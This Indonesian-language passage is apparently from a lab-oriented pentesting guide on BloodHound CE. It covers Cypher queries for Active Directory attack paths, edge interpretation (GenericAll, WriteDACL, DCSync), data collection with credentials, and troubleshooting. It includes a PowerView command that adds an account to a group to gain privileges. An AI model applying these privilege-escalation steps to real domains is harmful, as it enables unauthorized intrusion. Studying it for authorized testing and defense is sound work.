Kerberos pre-auth disabled
        ↓
AS-REP request
        ↓
offline crackable material
```

Kembali ke:

← [File 35: AD Initial Enumeration](https://chatgpt.com/c/[🏰 35 — Active Directory Initial Enumeration Workflow](/docs/ad-initial-enumeration))

dan lanjut ke:

→ [File 37: Kerberoasting & AS-REP Roasting](https://chatgpt.com/c/<a href="/docs/kerberoasting-asreproasting" class="text-[#00b4d8] hover:underline font-mono font-semibold">37_kerberoasting_asreproasting_workflow.md</a>)

---

# H — Shortest Paths to Domain Admins from Owned Users ⭐⭐⭐

Ini salah satu query paling berguna.

Sebelum menjalankannya:

```text
OWNED USER
```

harus ditandai.

---

# 4.2 🧪 CUSTOM CYPHER QUERIES

> **Catatan schema:** BloodHound CE berkembang dari versi ke versi dan hubungan/node schema dapat bertambah. Query di bawah memakai label/relationship AD yang umum pada BloodHound CE. Jika satu query gagal, cek nama relationship/property yang tersedia pada dataset Anda dan gunakan built-in search sebagai pembanding.
> 
> Hindari menjalankan query mutation. Query berikut hanya membaca graph.

---

## 1️⃣ Find All Users with `AdminCount=1`

### NAMA

```text
Users with AdminCount=1
```

### TUJUAN

Mencari akun yang ditandai sebagai privileged/protected-object candidate oleh `adminCount`.

### CYPHER

```cypher
MATCH (u:User)
WHERE u.admincount = true
RETURN u
ORDER BY u.name
```

### INTERPRET

Jika:

```text
alice
svc_backup
administrator
```

muncul:

```text
admincount = true
```

maka akun tersebut perlu diperiksa lebih lanjut.

**Penting:**

```text
admincount=true
≠
currently Domain Admin
```

Gunakan sebagai signal, bukan final verdict.

---

# 2️⃣ Find Computers with SMB Signing Disabled

### NAMA

```text
Computers with SMB Signing Disabled
```

### TUJUAN

Mencari computer nodes yang dikoleksi dengan SMB signing disabled.

### CYPHER

```cypher
MATCH (c:Computer)
WHERE c.smbsigning = false
RETURN c
ORDER BY c.name
```

### INTERPRET

Jika:

```text
WEB01
```

muncul:

```text
WEB01
smbsigning = false
```

maka:

```text
potential relay-related candidate
```

Tetapi:

```text
SMB signing disabled
≠
relay automatically successful
```

Periksa:

```text
protocol
authentication coercion
NTLM availability
network position
```

---

# 3️⃣ Find Users Who Can RDP to Computers

### NAMA

```text
Users with RDP Access
```

### TUJUAN

Mencari relationship `CanRDP`.

### CYPHER

```cypher
MATCH (u:User)-[:CanRDP]->(c:Computer)
RETURN u.name AS User,
       c.name AS Computer
ORDER BY User, Computer
```

### INTERPRET

Contoh:

```text
alice@CORP.LOCAL → WS01.CORP.LOCAL
```

Artinya:

```text
Alice
 ↓
CanRDP
 ↓
WS01
```

---

# 4️⃣ Find Users Who Can PSRemote

### NAMA

```text
Users with PSRemote Access
```

### TUJUAN

Mencari relationship WinRM/PowerShell Remoting.

### CYPHER

```cypher
MATCH (u:User)-[:CanPSRemote]->(c:Computer)
RETURN u.name AS User,
       c.name AS Computer
ORDER BY User, Computer
```

### INTERPRET

Jika:

```text
svc_backup → SRV01
```

maka user tersebut mempunyai recorded relationship:

```text
CanPSRemote
```

---

# 5️⃣ Find Privileged Users with Sessions

### NAMA

```text
Privileged Users with Active Sessions
```

### TUJUAN

Mencari privileged-looking users yang mempunyai session pada computer.

### CYPHER

```cypher
MATCH (u:User)-[:HasSession]->(c:Computer)
WHERE u.admincount = true
RETURN u.name AS User,
       c.name AS Computer
ORDER BY User, Computer
```

### INTERPRET

Jika:

```text
Administrator → WEB01
```

muncul:

```text
WEB01
```

menjadi:

```text
high-value session host
```

---

# 6️⃣ Find GPOs Affecting a Specific OU

### NAMA

```text
GPOs Affecting Specific OU
```

### TUJUAN

Mencari GPO yang mempunyai relationship terhadap OU.

### CYPHER

```cypher
MATCH (g:GPO)-[:GPOAppliesTo|GPLink]->(o:OU)
WHERE o.name = 'OU=Servers,DC=corp,DC=local'
RETURN g.name AS GPO,
       o.name AS OU
ORDER BY GPO
```

### INTERPRET

Jika:

```text
Default Domain Policy
```

muncul terhadap OU:

```text
Servers
```

maka policy tersebut dapat memengaruhi computer/user object di scope tersebut, tergantung link/enforcement/inheritance.

---

# 7️⃣ Find Users with GenericAll on Domain Admins

### NAMA

```text
GenericAll Against Domain Admins
```

### TUJUAN

Mencari principal dengan full-control style relationship terhadap group target.

### CYPHER

```cypher
MATCH (u:User)-[:GenericAll]->(g:Group)
WHERE toUpper(g.name) CONTAINS 'DOMAIN ADMINS'
RETURN u.name AS Principal,
       g.name AS Target
ORDER BY Principal
```

### INTERPRET

Jika:

```text
alice → GenericAll → Domain Admins
```

maka:

```text
ALERT: sangat penting
```

Tapi:

```text
GenericAll
```

harus dianalisis:

```text
Apakah relationship aktual?
Apakah inherited?
Apakah object benar-benar Domain Admins?
```

---

# 8️⃣ Find Users with WriteDACL

### NAMA

```text
Users with WriteDACL
```

### TUJUAN

Mencari principal yang dapat memodifikasi ACL object.

### CYPHER

```cypher
MATCH (u:User)-[:WriteDACL]->(n)
RETURN u.name AS Principal,
       labels(n) AS TargetType,
       n.name AS Target
ORDER BY Principal, Target
```

### INTERPRET

`WriteDACL` berarti:

```text
Principal
   ↓
can modify discretionary ACL
```

Impact:

```text
ACL
 ↓
add/control permission
 ↓
new edge
 ↓
new attack path
```

---

# 9️⃣ Find All Paths to High Value Targets

### NAMA

```text
Paths to High Value Targets
```

### TUJUAN

Mencari path dari user ke object bertanda high value.

### CYPHER

```cypher
MATCH p = shortestPath((u:User)-[*1..]->(t))
WHERE t.highvalue = true
RETURN p
LIMIT 50
```

### INTERPRET

Perhatikan:

```text
Source
 ↓
edge
 ↓
node
 ↓
edge
 ↓
target
```

Prioritaskan:

```text
short
+
known credentials
+
low prerequisite
```

---

# 🔟 Find Users with Unconstrained Delegation

### NAMA

```text
Unconstrained Delegation Users
```

### CYPHER

```cypher
MATCH (u:User)
WHERE u.unconstraineddelegation = true
RETURN u
ORDER BY u.name
```

### INTERPRET

Jika muncul:

```text
svc_sql
```

maka:

```text
svc_sql
 ↓
unconstrained delegation
```

menjadi candidate untuk deeper delegation analysis.

---

# 1️⃣1️⃣ Find DCSync-capable Principals

### NAMA

```text
Potential DCSync Principals
```

### CYPHER

```cypher
MATCH (n)-[:DCSync|GetChanges|GetChangesAll]->(d:Domain)
RETURN n.name AS Principal,
       d.name AS Domain
ORDER BY Principal
```

### INTERPRET

Cari:

```text
non-default user
non-default group
```

yang mempunyai relationship tersebut.

---

# 1️⃣2️⃣ Find Users with ForceChangePassword

### NAMA

```text
Users with ForceChangePassword
```

### CYPHER

```cypher
MATCH (u:User)-[:ForceChangePassword]->(v:User)
RETURN u.name AS Principal,
       v.name AS TargetUser
ORDER BY Principal, TargetUser
```

### INTERPRET

Jika:

```text
alice → ForceChangePassword → bob
```

berarti Alice memiliki relationship yang dapat memungkinkan password reset/change terhadap Bob dalam konteks yang dideskripsikan edge.

---

# 1️⃣3️⃣ Find Users with GenericWrite

### NAMA

```text
GenericWrite Relationships
```

### CYPHER

```cypher
MATCH (u:User)-[:GenericWrite]->(n)
RETURN u.name AS Principal,
       labels(n) AS TargetType,
       n.name AS Target
ORDER BY Principal, Target
```

### INTERPRET

GenericWrite:

```text
object modification
```

lebih terbatas daripada:

```text
GenericAll
```

Tetapi tetap sangat penting.

---

# 1️⃣4️⃣ Find Users Who Can AdminTo Computers

### NAMA

```text
Users with AdminTo
```

### CYPHER

```cypher
MATCH (u:User)-[:AdminTo]->(c:Computer)
RETURN u.name AS User,
       c.name AS Computer
ORDER BY User, Computer
```

### INTERPRET

Jika:

```text
alice → AdminTo → WEB01
```

maka Alice mempunyai administrative relationship terhadap WEB01.

---

# 1️⃣5️⃣ Find Computers with Privileged Sessions

### NAMA

```text
Computers with High Value Sessions
```

### CYPHER

```cypher
MATCH (u:User)-[:HasSession]->(c:Computer)
WHERE u.highvalue = true OR u.admincount = true
RETURN c.name AS Computer,
       u.name AS User
ORDER BY Computer, User
```

### INTERPRET

Ini berguna untuk mencari:

```text
host
 ↓
privileged user session
```

---

# 🧠 BAGIAN 5 — CARA BACA GRAPH

# 5.1 🔵 Node Types

|Node|Arti|Pertanyaan|
|---|---|---|
|User|Akun pengguna|Siapa orang/service account ini?|
|Computer|Host Windows|Siapa yang bisa mengaksesnya?|
|Group|Security group|Siapa anggotanya?|
|Domain|Domain AD|Apa target high-value-nya?|
|GPO|Group Policy|Apa policy yang memengaruhinya?|
|OU|Organizational Unit|Object apa yang ada di scope ini?|

---

# 👤 User Node

Contoh:

```text
ALICE@CORP.LOCAL
```

Klik node.

Cari:

```text
MemberOf
AdminTo
CanRDP
CanPSRemote
HasSession
GenericAll
GenericWrite
```

---

# 💻 Computer Node

Contoh:

```text
WEB01.CORP.LOCAL
```

Cari:

```text
AdminTo
HasSession
CanRDP
CanPSRemote
Unconstrained Delegation
```

---

# 👥 Group Node

Contoh:

```text
DOMAIN ADMINS@CORP.LOCAL
```

Cari:

```text
Members
ACLs
Paths
```

---

# 🌐 Domain Node

Contoh:

```text
CORP.LOCAL
```

Ini sangat penting untuk:

```text
DCSync
Domain Admins
ACL
Trust
```

---

# 🏛️ GPO Node

Cari:

```text
GPO
 ↓
OU
 ↓
Computer/User
```

---

# 🗂️ OU Node

OU adalah container logical.

Contoh:

```text
OU=Servers
OU=Workstations
OU=Admins
```

---

# 5.2 🔗 Edge / Relationship Types

|Edge|Artinya|Cara Exploit / Next Action|
|---|---|---|
|`MemberOf`|User/group anggota group|Follow nested groups|
|`AdminTo`|Principal admin terhadap computer|Uji authenticated administrative access|
|`HasSession`|User sedang/baru terlihat session pada computer|Prioritaskan host yang accessible|
|`CanRDP`|Bisa Remote Desktop|Credential + RDP path|
|`CanPSRemote`|Bisa PowerShell Remoting|Credential + WinRM path|
|`GenericAll`|Full-control-like object rights|Cari cara mengubah object/member/credential|
|`GenericWrite`|Dapat menulis property tertentu|Cari property berpengaruh|
|`WriteOwner`|Dapat mengubah owner|Ownership → ACL control|
|`WriteDACL`|Dapat mengubah ACL|Tambahkan permission/edge yang diperlukan|
|`ForceChangePassword`|Dapat memicu password change terhadap target|Password-reset path|
|`Owns`|Principal memiliki object|Cari control/abuse surface|
|`AllExtendedRights`|Extended rights luas pada object|Inspect exact rights|
|`AddMember`|Dapat menambahkan member ke group|Add controlled account pada lab|
|`DCSync`|Replication-based credential extraction capability|Critical privilege path|
|`GetChanges`|Salah satu directory replication right|Kombinasikan dengan related rights|
|`GetChangesAll`|Replication right tambahan|Bersama GetChanges dapat membentuk DCSync|
|`AllowedToDelegate`|Delegation relationship|Analyze Kerberos delegation|
|`AllowedToAct`|Resource-based constrained delegation relationship|RBCD path analysis|

---

# 🧠 `MemberOf`

Contoh:

```text
Alice
 ↓
MemberOf
 ↓
Helpdesk
```

Artinya:

```text
Alice anggota Helpdesk
```

Next:

```text
Helpdesk
 ↓
MemberOf
 ↓
IT Admin
```

Maka Anda harus mengikuti nested membership.

---

# 🔥 `AdminTo`

```text
Alice
 ↓
AdminTo
 ↓
WEB01
```

Artinya:

```text
Alice memiliki administrative access relationship terhadap WEB01.
```

Next:

```text
WEB01
 ↓
sessions?
 ↓
privileged users?
```

---

# 👤 `HasSession`

```text
Alice
 ↓
HasSession
 ↓
WEB01
```

Artinya:

```text
Alice mempunyai session yang terdeteksi pada WEB01.
```

Catatan:

```text
HasSession
≠
you can instantly control session
```

Collector data adalah snapshot dan bisa berubah.

---

# 🖥️ `CanRDP`

```text
Alice
 ↓
CanRDP
 ↓
WS01
```

Artinya:

```text
Alice mempunyai relationship yang memungkinkan RDP berdasarkan collected rights/configuration.
```

---

# 💻 `CanPSRemote`

```text
Alice
 ↓
CanPSRemote
 ↓
SRV01
```

Artinya:

```text
Alice mempunyai relationship PowerShell Remoting/WinRM terhadap SRV01.
```

---

# 💀 `GenericAll`

Ini salah satu edge yang paling sering membingungkan pemula.

Bayangkan:

```text
Alice
 ↓
GenericAll
 ↓
Bob
```

Secara sederhana:

```text
Alice punya kontrol sangat luas terhadap object Bob
```

Tetapi cara memanfaatkan GenericAll tergantung target.

---

## GenericAll terhadap User

Kemungkinan privilege surface:

```text
password/reset
key credential
attribute manipulation
group-related properties
```

---

## GenericAll terhadap Group

Kemungkinan:

```text
Add Member
```

sehingga:

```text
Alice
 ↓
GenericAll
 ↓
Domain Admins
```

dapat menjadi:

```text
membership modification
```

dalam lab.

---

## GenericAll terhadap Computer

Kemungkinan kontrol object/property yang jauh lebih luas.

Jangan langsung mengasumsikan:

```text
GenericAll → remote shell
```

Relationship harus diterjemahkan berdasarkan object target.

---

# 🧠 `GenericWrite`

Lebih terbatas:

```text
GenericWrite
```

berarti kemampuan menulis property tertentu pada object.

Cari:

```text
What object?
What property?
Is that property security-relevant?
```

---

# 🛠️ `WriteOwner`

```text
Alice
 ↓
WriteOwner
 ↓
Bob
```

Konsep:

```text
Alice dapat mengubah ownership
        ↓
becomes owner
        ↓
owner may gain ability to modify ACL
        ↓
additional rights
```

---

# 🛠️ `WriteDACL`

```text
Alice
 ↓
WriteDACL
 ↓
Bob
```

Artinya Alice mempunyai kemampuan untuk memodifikasi discretionary ACL Bob.

Conceptual chain:

```text
WriteDACL
 ↓
ACL modification
 ↓
new permission
 ↓
new relationship
 ↓
privilege
```

---

# 🔑 `ForceChangePassword`

```text
Alice
 ↓
ForceChangePassword
 ↓
Bob
```

Pertanyaan:

```text
Can Alice reset Bob's password?
```

Dalam lab, bila relationship valid dan target user dapat dikendalikan melalui password reset:

```text
Alice
 ↓
password control
 ↓
Bob
```

---

# 👑 `DCSync`

```text
Alice
 ↓
DCSync
 ↓
Domain
```

Ini:

```text
CRITICAL
```

karena relationship tersebut menyangkut replication privileges.

---

# 🧬 `GetChanges` + `GetChangesAll`

Secara konsep:

```text
GetChanges
+
GetChangesAll
      ↓
replication capability
      ↓
DCSync
```

Jadi jika Anda melihat dua edge tersebut menuju domain:

```text
DO NOT IGNORE
```

---

# 🎟️ `AllowedToDelegate`

Delegation relationship.

Pertanyaan:

```text
Who can delegate?
To which service?
Which account/computer?
```

---

# 🧩 `AllowedToAct`

Sangat penting dalam:

```text
Resource-Based Constrained Delegation
```

Mental model:

```text
Attacker-controlled principal
       ↓
AllowedToAct
       ↓
Target computer
```

Kemudian:

```text
delegation
 ↓
impersonation opportunity
```

---

# 5.3 🔬 Cara Membaca Attack Path

Gunakan pola:

```text
SOURCE
   ↓
EDGE
   ↓
NODE
   ↓
EDGE
   ↓
NODE
```

---

# 🟢 Start dari Owned Node

Contoh:

```text
Alice
```

Anda mendapatkan:

```text
Alice credentials
```

maka:

```text
Alice = Owned
```

---

# Follow Edges

Contoh:

```text
Alice
 ↓ MemberOf
Helpdesk
 ↓ GenericAll
Bob
 ↓ AdminTo
WEB01
```

Baca satu per satu.

---

# 🔥 Identify Chokepoints

Chokepoint:

```text
satu relationship
```

yang menjadi kunci banyak paths.

Contoh:

```text
50 paths
    ↓
same service account
    ↓
svc_backup
```

Maka:

```text
svc_backup
```

adalah chokepoint.

---

# ⭐ Prioritize

Gunakan:

```text
1. Short
2. Few prerequisites
3. Credentials already owned
4. Stable/reliable
5. Low complexity
```

---

# 🏷️ BAGIAN 6 — MARKING OWNED OBJECTS

# 6.1 🟢 Mark User as Owned

## Kapan?

Mark user sebagai owned setelah Anda mempunyai bukti bahwa:

```text
credentials valid
atau
object benar-benar compromised dalam lab
```

Jangan mark:

```text
"mungkin bisa"
```

sebagai owned.

---

# Step-by-Step

```text
1. Search user.
2. Open user node.
3. Open node/object actions.
4. Select ownership/mark as owned.
5. Confirm.
6. Return to pathfinding.
```

Nama tombol dapat berubah menurut versi UI.

---

# 🧠 Kenapa Ownership Penting?

Tanpa ownership:

```text
BloodHound:
"What paths exist?"
```

Dengan ownership:

```text
BloodHound:
"What can I reach from my compromised position?"
```

---

# 6.2 👑 High Value Targets

High Value berarti:

```text
object yang sangat penting bagi security boundary
```

Contoh:

```text
Domain Admin
Domain
Tier Zero objects
Critical DC
Identity infrastructure
```

---

# Mark High Value

Konsep:

```text
Select object
 ↓
Mark as High Value
```

Kemudian:

```text
High Value
```

dapat digunakan sebagai target pathfinding.

---

# Default High Value

BloodHound CE dapat menggunakan tagging/High Value concepts untuk menandai critical identities/objects.

Jangan menganggap semua:

```text
Administrator
```

memiliki impact identik dengan:

```text
Domain
```

Context penting.

---

# 6.3 🔥 Owned → Attack Path Workflow

Setelah user owned:

```text
Owned User
    ↓
Shortest Path
    ↓
Domain Admin
```

Kemudian:

```text
Owned User
    ↓
Shortest Paths to High Value
```

Cari juga:

```text
Owned User
    ↓
CanRDP
CanPSRemote
AdminTo
GenericAll
GenericWrite
ForceChangePassword
WriteDACL
WriteOwner
```

---

# 🧭 BAGIAN 7 — WORKFLOW LENGKAP

# LANGKAH 1 🛠️ Prepare Environment

```bash
# Set lab variables
export DOMAIN="corp.local"
export DC_IP="10.10.10.10"
export USERNAME="alice"
export PASSWORD="LAB_PASSWORD"

# Verify values
printf 'DOMAIN=%s\nDC_IP=%s\nUSERNAME=%s\n' \
  "$DOMAIN" "$DC_IP" "$USERNAME"
```

---

# LANGKAH 2 🐍 Collect Data

```bash
# Run a broad BloodHound CE collection
bloodhound-ce-python \
  -d "$DOMAIN" \
  -u "$USERNAME" \
  -p "$PASSWORD" \
  -dc "dc01.$DOMAIN" \
  -c All \
  --zip
```

---

# LANGKAH 3 🐳 Start BloodHound CE

```bash
# Enter BloodHound CE directory
cd ~/tools/bloodhound-ce

# Start services
docker compose up -d

# Check service status
docker compose ps
```

---

# LANGKAH 4 📥 Import

```text
ZIP
 ↓
BloodHound UI
 ↓
Import
 ↓
Wait
 ↓
Search domain
 ↓
Verify users/computers/groups
```

---

# LANGKAH 5 🟢 Mark Owned Users

```text
Known valid credential
      ↓
Search user
      ↓
Open node
      ↓
Mark Owned
```

---

# LANGKAH 6 🔎 Run Pre-Built Queries

Urutan recommended:

```text
1. Domain Admins
2. High Value Targets
3. Shortest Path
4. DCSync
5. Privileged Sessions
6. RDP
7. PSRemote
8. Kerberoastable
9. AS-REP Roastable
10. Delegation
```

---

# LANGKAH 7 🧠 Analyze Attack Paths

Untuk setiap path:

```text
[1] Current position
[2] First edge
[3] Prerequisite
[4] Target
[5] Next edge
[6] Chokepoint
[7] Final privilege
```

---

# LANGKAH 8 📝 Document Findings

Template:

```text
SOURCE:
alice@corp.local

TARGET:
Domain Admins

PATH:
alice
→ MemberOf
→ Helpdesk
→ GenericAll
→ svc_backup
→ AdminTo
→ WEB01
→ HasSession
→ administrator
```

Kemudian:

```text
Prerequisites:
- alice password
- access to WEB01
- privileged session present

Chokepoint:
- svc_backup

Risk:
- privilege escalation
```

---

# LANGKAH 9 🎯 Plan Next Steps

Contoh:

```text
Kerberoastable user found
        ↓
File 37

ACL path found
        ↓
ACL-focused privilege abuse

Delegation path found
        ↓
Delegation workflow

RDP path found
        ↓
Credentialed lateral movement
```

---

# 🔥 BAGIAN 8 — COMMON SCENARIOS

# SCENARIO 1 — Tidak Ada Path ke Domain Admin

Jangan menyimpulkan:

```text
"No path = BloodHound useless."
```

Itu terlalu cepat.

Kemungkinan:

```text
collection tidak lengkap
owned node belum benar
session data kosong
ACL tidak terkumpul
credential belum cukup
attack path membutuhkan technique yang belum dikoleksi
```

---

# Next Actions

## Check Collection

```text
Users?
Groups?
Computers?
ACL?
Sessions?
Trust?
GPO?
```

---

## Check Kerberoasting

```text
HasSPN?
```

Jika ada:

```text
File 37
```

---

## Check AS-REP

```text
DONT_REQUIRE_PREAUTH?
```

---

## Check ACL

Cari:

```text
GenericAll
GenericWrite
WriteDACL
WriteOwner
ForceChangePassword
AddMember
```

---

## Check Sessions

```text
HasSession
```

---

# SCENARIO 2 — Path 5+ Steps 🧩

Contoh:

```text
Alice
 ↓
MemberOf
 ↓
Helpdesk
 ↓
GenericAll
 ↓
Bob
 ↓
CanRDP
 ↓
WEB01
 ↓
HasSession
 ↓
Administrator
```

Jangan langsung mengatakan:

```text
"too long"
```

Analisis satu per satu.

---

# Step Analysis

|Step|Pertanyaan|
|---|---|
|Alice → Helpdesk|Credential available?|
|Helpdesk → Bob|Membership valid?|
|GenericAll → Bob|Can relationship be abused?|
|Bob → WEB01|Can RDP actually work?|
|WEB01 → Administrator|Session current?|
|Administrator|Is account privileged?|

---

# Shortest vs Easiest

Path A:

```text
3 steps
```

tetapi membutuhkan:

```text
unknown credential
```

Path B:

```text
5 steps
```

tetapi semuanya memakai:

```text
already-owned credential
```

Maka:

```text
Path B
```

bisa lebih realistis.

---

# SCENARIO 3 — GenericAll Ditemukan 💥

## Immediate Actions

Pertama identifikasi target:

```text
GenericAll
 ↓
WHAT OBJECT?
```

---

# Case A — GenericAll terhadap Group

Contoh:

```text
Alice
 ↓
GenericAll
 ↓
Helpdesk
```

Jika group tersebut mengarah ke:

```text
Domain Admins
```

via nested membership, ini sangat penting.

Di lab, prinsip exploit-nya:

```text
Control group
 ↓
Add controlled user
 ↓
Group membership
 ↓
New privilege
```

Contoh PowerView pada Windows lab:

```powershell
# Import PowerView in the authorized lab
. .\PowerView.ps1

# Add a controlled lab account to a target group
Add-DomainGroupMember -Identity "Helpdesk" -Members "alice"
```

Jangan menjalankan terhadap production.

---

# Case B — GenericAll terhadap User

Mental model:

```text
GenericAll
 ↓
user object
 ↓
credential/attribute control
```

Periksa:

```text
password
SPN
key credential
sensitive attributes
```

---

# Case C — GenericAll terhadap Computer

Periksa:

```text
object properties
local admin relationships
delegation
ACL
```

---

# SCENARIO 4 — Unconstrained Delegation 🎟️

Jika menemukan:

```text
HOST01
 ↓
Unconstrained Delegation
```

maka:

```text
do not immediately pivot
```

Pertanyaan:

```text
Who logs into HOST01?
Does a privileged user authenticate there?
Is the account active?
Is there a better path?
```

Kemudian arahkan analysis ke workflow delegation yang sesuai pada knowledge base Anda.

---

# 🧠 BAGIAN 9 — COMMON ERRORS & TROUBLESHOOTING

|Error|Sebab|Solusi|
|---|---|---|
|Docker tidak bisa start|Service Docker mati|`sudo systemctl enable --now docker`|
|BloodHound UI tidak bisa diakses|Container gagal start|`docker compose ps` lalu `docker compose logs bloodhound`|
|Port 8080 sudah digunakan|Service lain memakai port|`ss -lntp \| grep ':8080'`|
|Import gagal|ZIP rusak/schema tidak cocok|`unzip -t file.zip` dan gunakan collector CE yang cocok|
|Node count 0|Import/collection salah|Search domain dan cek collector JSON|
|Users ada, computers 0|Collection computer gagal|Periksa SMB/RPC/DNS dan collection method|
|Query tidak return hasil|Memang tidak ada relationship|Validasi dengan broader query|
|Query syntax error|Schema/Cypher version mismatch|Jalankan query sederhana `MATCH (n) RETURN n LIMIT 5`|
|Neo4j connection refused|Container graph DB mati|`docker compose ps graph-db`|
|PostgreSQL connection refused|app DB mati|`docker compose logs app-db`|
|`bloodhound-ce-python` tidak ditemukan|PATH/pipx issue|`pipx ensurepath` lalu cek `$HOME/.local/bin`|
|Kerberos clock skew|Waktu attacker/DC berbeda|Sinkronkan clock pada lab|
|Kerberos authentication gagal|DNS/realm salah|Gunakan DC FQDN dan `$DOMAIN` benar|
|LDAP connection failed|Port 389/636 tidak reachable|Nmap DC dan cek DNS|
|`KDC_ERR_PREAUTH_FAILED`|Credential salah/pre-auth issue|Validasi username/password|
|DNS resolution gagal|Parrot memakai DNS yang salah|Gunakan `/etc/hosts` atau `-ns "$DC_IP"`|
|ZIP berisi sedikit file|Collection method terbatas|Gunakan `-c All` di lab|
|SharpHound gagal jalan|EDR/AV/permissions|Periksa lab restrictions dan collector output|
|Session tidak muncul|Session collection tidak dilakukan/visibility terbatas|Collection `Session`/`All`|
|ACL relationship tidak muncul|ACL collection gagal|Recollect `ACL`/`All`|
|Domain tidak muncul|Domain collection gagal|Check credentials, DNS, LDAP|
|Password initial BloodHound hilang|Startup output terlewat|`docker compose logs bloodhound`|
|Login gagal setelah change password|Salah menyimpan password baru|Reset/reinitialize lab sesuai deployment|
|BloodHound lambat|Graph besar/RAM kurang|Kurangi collection/query breadth|
|`docker compose up` stuck|Healthcheck DB belum ready|`docker compose ps` dan logs app-db/graph-db|
|Query kompleks timeout|Graph query terlalu besar|Tambahkan filter dan `LIMIT`|
|Path tidak masuk akal|Data stale/incomplete|Recollect dan compare timestamps|
|`CanRDP` ada tetapi login gagal|Policy/credential berbeda|Validate actual Windows access|
|`HasSession` ada tetapi user sudah logout|Snapshot stale|Recollect session data|
|`AdminTo` ada tetapi command execution gagal|Remote service blocked|Bedakan graph privilege dari network reachability|
|`GenericAll` ada tetapi exploit gagal|Target/property berbeda|Inspect exact object and abuse primitive|

---

# ⏰ Clock Skew Saat Collection

Salah satu error Kerberos yang paling sering:

```text
KRB_AP_ERR_SKEW
```

atau:

```text
Clock skew too great
```

---

# Cek Parrot

```bash
# Show current system date/time
date

# Show system clock details
timedatectl
```

---

# Cek DC Connectivity

```bash
# Check Kerberos port
nmap -Pn -p 88 "$DC_IP"

# Check SMB time information if supported
nmap -Pn -p 445 --script smb2-time "$DC_IP"
```

---

# Mental Model

```text
Parrot:
17:00

DC:
17:07

Kerberos:
❌
```

Jadi:

```text
Kerberos error?
 ↓
Check clock FIRST.
```

---

# 🧪 Query Tidak Return Hasil

Jangan langsung mengubah query menjadi semakin kompleks.

Mulai:

```cypher
MATCH (n)
RETURN n
LIMIT 5
```

Kemudian:

```cypher
MATCH (u:User)
RETURN u
LIMIT 5
```

Kemudian:

```cypher
MATCH (c:Computer)
RETURN c
LIMIT 5
```

Kemudian:

```cypher
MATCH (u:User)-[:MemberOf]->(g:Group)
RETURN u,g
LIMIT 10
```

Mental model:

```text
Basic query
 ↓
verify schema
 ↓
add condition
 ↓
add relationship
 ↓
complex query
```

---

# 🔍 Node Count 0

Jika:

```text
Users = 0
Groups = 0
Computers = 0
```

pertama-tama cek:

```text
ZIP
 ↓
JSON
 ↓
import
 ↓
domain
```

Jangan menyalahkan Cypher dahulu.

---

# 🔌 Neo4j Connection Refused

```bash
# Check graph DB status
docker compose ps graph-db

# Check graph DB logs
docker compose logs --tail 100 graph-db

# Check local Neo4j port
ss -lntp | grep ':7687'
```

Jika:

```text
graph-db exited
```

perbaiki database/container dulu.

---

# 🐍 CE Python Error

```bash
# Check installed collector
which bloodhound-ce-python

# Check version/help
bloodhound-ce-python --help

# Check pipx environment
pipx list
```

Jika tidak ditemukan:

```bash
# Reinstall the CE ingestor
pipx reinstall bloodhound-ce
```

---

# 🧠 BAGIAN 10 — DECISION TREE

```text
                    IMPORT DATA
                         │
                         ▼
                 Domain detected?
                  ┌──────┴──────┐
                 NO             YES
                 │               │
                 ▼               ▼
          Check ZIP/schema   Verify node counts
                                 │
                                 ▼
                         Users present?
                          ┌──────┴──────┐
                         NO             YES
                         │               │
                         ▼               ▼
                    Recollect       Groups?
                                     │
                                     ▼
                                  Computers?
                                     │
                                     ▼
                                   ACLs?
                                     │
                    ┌────────────────┼────────────────┐
                    │                │                │
                    ▼                ▼                ▼
                 Sessions          SPNs            GPO/Trust
                    │                │                │
                    └────────────────┼────────────────┘
                                     ▼
                              Mark Owned User
                                     │
                                     ▼
                           Find High Value Targets
                                     │
                                     ▼
                         Shortest Path to DA
                                     │
                              ┌──────┴──────┐
                             NO             YES
                             │               │
                             ▼               ▼
                       Check primitives   Analyze every edge
                             │               │
                ┌────────────┼────────────┐  │
                │            │            │  │
                ▼            ▼            ▼  ▼
             Kerberoast    AS-REP       ACL  Session
                │            │            │    │
                └────────────┼────────────┴────┘
                             ▼
                       New credentials?
                             │
                       ┌─────┴─────┐
                      NO          YES
                       │            │
                       ▼            ▼
                    Recollect    Validate
                    /expand       creds
                                    │
                                    ▼
                               Mark Owned
                                    │
                                    ▼
                               Re-run paths
                                    │
                                    ▼
                                 IMPACT
```

---

# 🎯 SECONDARY DECISION TREE — MEMBACA SATU EDGE

```text
                  FOUND EDGE
                      │
                      ▼
                What does it mean?
                      │
          ┌───────────┼──────────────┐
          │           │              │
          ▼           ▼              ▼
      Membership    Access         Control
          │           │              │
          ▼           ▼              ▼
      MemberOf     RDP/Admin     GenericAll
      AddMember    PSRemote      GenericWrite
                   AdminTo        WriteDACL
                                  WriteOwner
                                      │
                                      ▼
                                  Credential?
                                      │
                         ┌────────────┴──────────┐
                        NO                       YES
                         │                         │
                         ▼                         ▼
                    Find primitive           Validate credential
                         │                         │
                         ▼                         ▼
                     New edge                 OWNED
                                                   │
                                                   ▼
                                              Pathfinding
```

---

# 🏆 BAGIAN 11 — GOLDEN RULES

## 🥇 Rule 01

```text
BloodHound = relationship analysis
```

Bukan sekadar:

```text
asset scanner
```

---

## 🥇 Rule 02

```text
Garbage collection
→
garbage graph
```

Pastikan collector lengkap.

---

## 🥇 Rule 03

```text
Node = object
Edge = relationship
Path = sequence of relationships
```

---

## 🥇 Rule 04

```text
Shortest Path ≠ Best Path
```

Selalu pertimbangkan:

```text
prerequisites
credentials
network reachability
stability
```

---

## 🥇 Rule 05

```text
AdminCount=1 ≠ Domain Admin
```

Gunakan sebagai signal.

---

## 🥇 Rule 06

```text
HasSession ≠ remote control
```

Session adalah informasi yang harus dikorelasikan dengan access.

---

## 🥇 Rule 07

```text
CanRDP ≠ guaranteed login
```

Credential, account status, policy, network path tetap relevan.

---

## 🥇 Rule 08

```text
GenericAll ≠ automatic shell
```

Selalu tanyakan:

```text
GenericAll terhadap WHAT?
```

---

## 🥇 Rule 09

```text
WriteDACL
=
permission manipulation opportunity
```

Bukan langsung:

```text
RCE
```

---

## 🥇 Rule 10

```text
DCSync rights
=
critical
```

Jika principal non-default memiliki relationship tersebut, investigasi segera.

---

## 🥇 Rule 11

```text
Owned
=
verified control
```

Jangan mark node hanya karena:

```text
"mungkin bisa"
```

---

## 🥇 Rule 12

```text
High Value
=
priority target
```

---

## 🥇 Rule 13

```text
One edge at a time.
```

Saat melihat path:

```text
A → B → C → D
```

analisis:

```text
A→B
```

dulu.

---

## 🥇 Rule 14

```text
